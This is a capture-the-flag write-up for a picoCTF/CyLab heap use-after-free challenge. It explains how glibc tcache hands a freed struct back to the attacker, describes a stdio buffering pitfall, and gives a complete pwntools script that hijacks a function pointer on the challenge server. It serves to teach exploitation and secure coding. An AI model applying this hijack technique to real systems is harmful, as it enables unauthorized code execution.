# Unsubscriptions Are Free — Heap Use-After-Free & Tcache Reuse

* **Platform:** [CyLab Security Academy](https://learn.cylabacademy.org/) / [picoCTF](https://play.picoctf.org/)  
* **Category:** Binary Exploitation (Heap / UAF)  
* **Difficulty:** Medium (CyLab 3)  
* **Tools:** `file`, `checksec`, GDB with `pwndbg`, Python 3 (`pwntools`)  
* **Binary:** 32-bit ELF (`vuln`) — provided with source `vuln.c`  

---

## TL;DR

A classic 32-bit Heap **Use-After-Free (UAF)** challenge that taught me how glibc's memory allocator actually behaves under the hood. The program frees a heap-allocated `user` command struct upon unsubscribing (`free(user)`), but leaves behind a dangling pointer without setting it to `NULL`. When we immediately choose the feedback option, glibc's **tcache** recycles the exact same 16-byte freed chunk for our message buffer. By overwriting the struct's first field (a function pointer) with the address of `hahaexploitgobrrr()`, the next loop iteration jumps directly to print the flag. A major debugging headache I ran into was **stdio buffering** desynchronization between `scanf()` and raw `read()`.

---

## Student's Learning Note: From Systems Theory to Exploitation

In our university computer systems lectures, professors always warn us: *"Calling `free(ptr)` does not erase memory or reset the pointer variable!"* This challenge was the first time I saw why that warning matters so much in the real world:

1. **Use-After-Free (UAF):** When `free(user)` runs, the memory block is returned to the heap manager, but the pointer variable `user` still points to that exact memory address. If the program continues referencing `user->whatToDo()`, it operates on stale (dangling) memory.
2. **glibc Tcache Recycled Chunks (LIFO):** For speed, modern glibc uses per-thread caching bins (tcache) for small allocations ($\le 0x410$ bytes). Freed chunks are pushed onto a singly-linked list. The very next `malloc` requesting the same size class pops the most recently freed chunk off the top of the stack (Last-In, First-Out).
3. **Controlling the Chunk:** Because our user feedback buffer requests a similar allocation size, `malloc(8)` hands us the exact chunk that `user` is still pointing to. We gain full write access over the struct fields!

---

## Reconnaissance & Source Review

Checking the binary with `checksec`:
* **Arch:** Intel i386 (32-bit LSB)
* **Canary:** No canary found
* **NX:** NX enabled (Heap & Stack non-executable)
* **PIE:** No PIE (`0x08048000` base) — All function addresses are completely static!

Inspecting the provided `vuln.c`, the command struct is defined as:

```c
typedef struct {
    uintptr_t (*whatToDo)();   // Function pointer at offset 0
    char *username;
} cmd;

cmd *user;
```

Tracing the control flow in `main()`:
1. `user = malloc(sizeof(cmd));` $\rightarrow$ Allocates a 16-byte heap chunk (0x10 size class).
2. Option `'I'` calls `i()`: Prompts for confirmation `(Y/N)`, then executes `free(user);`. Crucially, `user` is **never assigned `NULL`**!
3. Option `'L'` calls `leaveMessage()`: Executes `msg = malloc(8);` and reads 8 bytes from `stdin` via raw `read(0, msg, 8);`.
4. In the main loop: The program repeatedly calls `doProcess(user)`, which attempts to execute `(*user->whatToDo)();`.

---

## Vulnerability & Exploitation Strategy

```text
1. Initial Allocation:
   [ Chunk @ Heap ] -> Holds struct cmd { whatToDo, username }

2. Trigger Option 'I' (Unsubscribe):
   free(user);      -> Chunk placed into tcache list (0x10 bin).
                       'user' pointer remains pointing here (Dangling Pointer!).

3. Trigger Option 'L' (Leave Message):
   msg = malloc(8); -> glibc reuses the exact same 0x10 chunk from tcache!
   read(0, msg, 8); -> We write: [ &hahaexploitgobrrr ] + [ padding ]

4. Program Loop:
   Calls (*user->whatToDo)(); -> Execution hijacked to hahaexploitgobrrr()!
```

Target address obtained via `nm`:
* `hahaexploitgobrrr` = `0x08049266`

---

## My Debugging Hurdle: The stdio Buffering Trap

When I wrote my first exploit script, I piped all commands together:
```python
p.send(b"I\nY\nL" + p32(0x08049266) + b"AAAA")
```
The remote process immediately crashed with `SIGSEGV` without printing the flag. I spent over an hour in GDB stepping through instructions before realizing what happened:

> [!WARNING]
> **Mixed I/O Desynchronization:**  
> The menu uses `scanf()`, which is **buffered I/O** (it reads blocks of data from the socket into internal libc buffers). But `leaveMessage()` uses `read(0, msg, 8)`, which is an **unbuffered raw system call**.  
> When I sent `'I\nY\nL'` in one burst, `scanf()` consumed everything from the socket buffer. When `read(0, msg, 8)` ran, the socket stream was already empty! `read()` returned 0, leaving our heap chunk empty and uninitialized.

### The Fix
I updated the exploit script to synchronize with every prompt before transmitting the next payload segment:
1. Send `'I\n'`, wait for `(Y/N)?`.
2. Send `'Y\n'`, wait for the menu to reappear.
3. Send `'L'` alone, wait for the `try anyways:` prompt.
4. Only then transmit the 8-byte payload: `p32(0x08049266) + b"AAAA"`.

---

## Exploit Script

```python
#!/usr/bin/env python3
"""
CyLab / picoCTF — Unsubscriptions Are Free
Exploit: Heap Use-After-Free (UAF) + glibc tcache recycling
"""

from pwn import *

context.arch = 'i386'
context.log_level = 'info'

EXE = "./vuln"
HOST = "xebec.cylabacademy.net"
PORT = 30956

TARGET_FUNC = 0x08049266  # hahaexploitgobrrr()

def main():
    p = remote(HOST, PORT)

    # 1. Free the user chunk (creates dangling pointer in 'user')
    p.recvuntil(b"(e)xit")
    p.send(b"I\n")
    p.recvuntil(b"(Y/N)?")
    p.send(b"Y\n")

    # 2. Reallocate chunk via leaveMessage() and overwrite function pointer
    p.recvuntil(b"(e)xit")
    p.send(b"L")
    p.recvuntil(b"try anyways:")
    p.send(p32(TARGET_FUNC) + b"AAAA")

    # 3. Receive flag
    flag_output = p.recvall(timeout=5).decode(errors="replace")
    print(flag_output)

if __name__ == "__main__":
    main()
```

*(See [`exploit.py`](exploit.py) for the complete script).*

---

## Flag

```text
academy{redacted}
```
*(Flag redacted in accordance with competition disclosure guidelines)*

---

## Key Takeaways & Lessons

1. **Always Nullify Freed Pointers:** Setting `ptr = NULL;` immediately after `free(ptr);` prevents dangling pointers and eliminates UAF vulnerabilities at the source.
2. **Understand Memory Allocator Reuse:** Modern allocators (like glibc's tcache) prioritize speed over security, instantly reusing the most recently freed chunk of the same size class without zeroing out memory.
3. **Be Wary of Mixed I/O Buffering:** Mixing high-level buffered functions (`scanf()`, `fgets()`) with raw low-level syscalls (`read()`) frequently causes input desynchronization. Always wait for application prompts when writing exploit scripts.
